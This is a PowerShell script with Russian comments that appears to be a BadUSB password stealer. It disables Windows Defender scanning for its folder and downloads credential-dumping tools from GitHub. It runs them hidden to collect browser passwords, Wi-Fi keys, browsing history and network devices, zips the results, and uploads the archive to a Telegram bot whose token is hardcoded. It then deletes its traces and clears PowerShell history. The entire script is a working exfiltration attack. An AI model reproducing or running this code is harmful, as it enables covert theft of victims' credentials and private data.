#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# 1. Подготовка папок
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# 2. Попытка отключить защитник для этой папки
Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

# 3. Ссылки на файлы (используем стабильные raw-ссылки)
$myRepo = "https://github.com/whetherit/tools/raw/main"
$origRepo = "https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files"

# Скачивание инструментов
Write-Host "Downloading tools..."
Invoke-WebRequest "$myRepo/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest "$origRepo/WirelessKeyView.exe" -OutFile "WirelessKeyView.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest "$origRepo/BrowsingHistoryView.exe" -OutFile "BrowsingHistoryView.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest "$origRepo/WNetWatcher.exe" -OutFile "WNetWatcher.exe" -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

# 4. Выполнение инструментов (Метод принудительного скрытия окна)
# Используем Start-Process с WindowStyle Hidden, чтобы окно точно не всплыло

Write-Host "Executing tools..."

# Сбор паролей браузера (твоя ссылка)
if (Test-Path "WebBrowserPassView.exe") {
    Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden -Wait
}

# Сбор Wi-Fi
if (Test-Path "WirelessKeyView.exe") {
    Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden -Wait
}

# История браузера
if (Test-Path "BrowsingHistoryView.exe") {
    Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden -Wait
}

# Устройства в сети
if (Test-Path "WNetWatcher.exe") {
    Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden -Wait
}

# 5. Сбор и упаковка данных
$reportFiles = @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")
foreach ($file in $reportFiles) {
    if (Test-Path $file) {
        Move-Item $file -Destination "$dumpFolder" -Force
    }
}

if (Get-ChildItem "$dumpFolder") {
    Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
}

# 6. Отправка в Telegram через CURL (надежнее всего)
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$uri = "https://api.telegram.org/bot$token/sendDocument"

if (Test-Path $dumpFile) {
    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Data from $env:USERNAME" $uri
}

# 7. Очистка следов
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

# 8. Финальный сигнал (Caps Lock)
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Чистим историю PowerShell
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

exit
